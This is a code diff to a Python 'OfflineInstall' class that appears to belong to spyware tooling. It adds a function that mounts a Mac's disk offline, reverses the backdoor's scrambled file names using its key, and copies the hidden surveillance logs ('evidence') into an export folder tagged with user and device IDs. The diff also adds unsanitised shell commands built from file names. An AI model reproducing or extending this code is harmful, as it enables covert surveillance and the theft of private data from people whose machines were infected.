@@ -10,6 +10,7 @@ import shutil
 import time
 import datetime
 import json
+import re
 
 class OfflineInstall(object):
 	builder = None
@@ -1691,14 +1692,160 @@ class OfflineInstall(object):
 			self.select_os(None)
 
 	#
+	# Scrambling/Descrambling of a string
+	##
+	def scramble_name(self, string, scramble, crypt):
+		ALPHABET_LEN = 64
+
+		alphabet = ['_', 'B', 'q', 'w', 'H', 'a', 'F', '8', 'T', 'k', 'K', 'D', 'M',
+			    'f', 'O', 'z', 'Q', 'A', 'S', 'x', '4', 'V', 'u', 'X', 'd', 'Z',
+			    'i', 'b', 'U', 'I', 'e', 'y', 'l', 'J', 'W', 'h', 'j', '0', 'm',
+			    '5', 'o', '2', 'E', 'r', 'L', 't', '6', 'v', 'G', 'R', 'N', '9',
+			    's', 'Y', '1', 'n', '3', 'P', 'p', 'c', '7', 'g', '-', 'C']
+
+		#
+		# Don't using the original names when byte is 0 or not
+		##
+		scramble %= ALPHABET_LEN
+
+		if scramble == 0:
+			scramble = 1
+
+		ret_string = ""
+
+		for i in range(0, len(string)):
+			found = False
+
+			for j in range(0, ALPHABET_LEN):
+				if string[i] == alphabet[j]:
+					found = True
+
+					#
+					# If crypt is true using crypt, else using decrypt
+					##
+					if crypt == True:
+						ret_string += alphabet[(j + scramble) % ALPHABET_LEN]
+					else:
+						ret_string += alphabet[(j + ALPHABET_LEN - scramble) % ALPHABET_LEN]
+					break
+
+			if found == False:
+				ret_string += string[i]
+
+		return ret_string
+
+	#
+	# Return Windows style timestamp with hex values 
+	##
+	def ts_unix2win(self):
+		#
+		# Unix Timestamp
+		##
+		uts = int(time.time())
+		magic_number = 116444736000000000 + 86400
+
+		# 
+		# Windows Timestamp
+		##
+		wts = str(((uts * 10000000) + magic_number))
+
+		# 
+		# High and Low Timestamp
+		##
+		high_dt = wts[0:9]
+		low_dt = wts[9:18]
+
+		#
+		# Hex values
+		##
+		hex_high_dt = "{:08X}".format(int(high_dt))
+		hex_low_dt = "{:08X}".format(int(low_dt))
+
+		return [hex_high_dt, hex_low_dt]
+
+	#
 	# Export logs of the infection vector on Mac OS X system with backdoor of the user
 	##
 	def export_osx_logs(self, user):
 		print("    Try to export logs for " + user + " on Mac OS X system...")
+		
+		[hex_high_dt, hex_low_dt] = self.ts_unix2win()
 
 		#
-		# TODO: esportare log dell'user
+		# Create Directory for log of this user
 		##
+		dest_path = self.destdir + "/" + self.backconf['huid'] + "_EXP_" + hex_high_dt + hex_low_dt + "000000000000000000000000"
+
+		try:
+			shutil.rmtree(dest_path)
+		except:
+			pass
+
+		os.mkdir(dest_path) 
+
+		#
+		# Create File with Info of this user
+		##
+		clear_path = dest_path + "/offline.ini"
+		f = open(clear_path, 'a')
+		s =  "[OFFLINE]\n"
+		s += "USERID=" + user + "\n"
+		s += "DEVICEID=" + self.tabosx['osname'] + "\n"
+		s += "FACTORY=" + self.backconf['huid'] + "\n"
+		s += "INSTANCE=0\n"
+		s += "PLATFORM=MACOS\n"
+		s += "SYNCTIME=" + hex_high_dt + "." + hex_low_dt + "\n"
+		f.write(s)
+		f.close()
+
+		scrambled_search_old = self.scramble_name("LOG*.???", int(self.backconf['hkey'], 16), True)
+		scrambled_searchA = scrambled_search_old[0:3] + '.*?\..{3}'
+		scrambled_path = "/mnt/Users/" + user + "/Library/Preferences/" + self.backconf['hdir']
+
+		try:
+			ret = subprocess.check_output("umount /mnt 2> /dev/null", shell=True)
+		except:
+			pass
+
+		try:
+			ret = subprocess.check_output("mount -t {} /dev/{} /mnt/ 2> /dev/null".format(self.tabosx['rootfsrw'], self.tabosx['rootdisk']), shell=True)
+		except:
+			print("      Export logs [ERROR] -> " + user + " on Mac OS X system!")
+			shutil.rmtree(dest_path)
+			return False 
+
+		if os.path.exists(scrambled_path) == True:
+			evidence = [f for f in os.listdir(scrambled_path) if re.match(scrambled_searchA, f)]
+
+			count = 0
+
+			for i in evidence:
+				source = scrambled_path + "/" + i
+				dest = dest_path + "/" + i
+
+				print("        Copying file " + str(count) + " of " + str(len(evidence)) + "...")
+				print("          " + source + " -> " + dest)
+				subprocess.call("cp {} {}".format(source, dest), shell=True)
+
+				count += 1
+		else:
+			evidence = []
+
+		if evidence == []:
+			print("      Export logs [ERROR] -> No evidences for " + user + " on Mac OS X system!")
+			shutil.rmtree(dest_path)
+
+			try:
+				ret = subprocess.check_output("umount /mnt 2> /dev/null", shell=True)
+			except:
+				pass
+
+			return False
+
+		try:
+			ret = subprocess.check_output("umount /mnt 2> /dev/null", shell=True)
+		except:
+			pass
 
 		print("      Export logs [OK] -> " + user + " on Mac OS X system!")
 		return True
